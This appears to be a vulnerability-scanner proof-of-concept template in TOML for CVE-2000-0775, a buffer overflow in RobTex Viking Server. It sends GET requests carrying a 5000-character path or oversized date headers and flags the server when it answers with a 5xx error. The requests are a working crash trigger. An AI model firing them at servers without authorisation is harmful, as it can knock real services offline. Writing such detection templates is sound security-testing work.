[info]
author = "ave"
description = "检测 RobTex Viking Server 缓冲区溢出漏洞（CVE-2000-0775）。通过发送超长 HTTP GET 请求或超长请求头触发缓冲区溢出，观察服务器是否崩溃或返回异常响应。"
id = "POC-AVE-2000-0583"
name = "CVE-2000-0775 PoC"
severity = "high"
tags = ["ave-2000-0583"]
vuln_id = [
    "CVE-2000-0775",
    "AVE-2000-0583",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/{{randstr_5000}}"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
    504,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "header"
type = "word"
words = [
    "Server",
    "Viking",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/index.html"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
If-Modified-Since = "{{randstr_5000}}"
If-Range = "{{randstr_5000}}"
Unless-Modified-Since = "{{randstr_5000}}"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
    504,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "header"
type = "word"
words = [
    "Server",
    "Viking",
]
